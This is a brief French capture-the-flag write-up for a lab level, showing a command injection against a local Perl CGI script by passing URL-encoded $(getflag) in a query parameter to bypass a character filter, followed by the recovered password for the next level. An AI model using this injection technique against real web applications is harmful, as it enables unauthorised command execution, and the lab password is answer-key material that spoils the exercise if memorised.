## 1. Accéder au script Perl via l'URL

    curl http://localhost:4747/level04.pl?x=test

Cela lance le script Perl et affiche test en console.

## 2. Exécuter une commande via injection dans l'URL

    curl http://localhost:4747/level04.pl?x=test%24%28getflag%29
    nb: %24%28getflag%29 = $(getflag)
    nb: http://localhost:4747/level04.pl?x="test$(getflag)" illegal characters detected
    Cela affiche: ne2searoevaevoem4ov4ar8ap

## 3. Connexion

su level05

    Mot de passe : ne2searoevaevoem4ov4ar8ap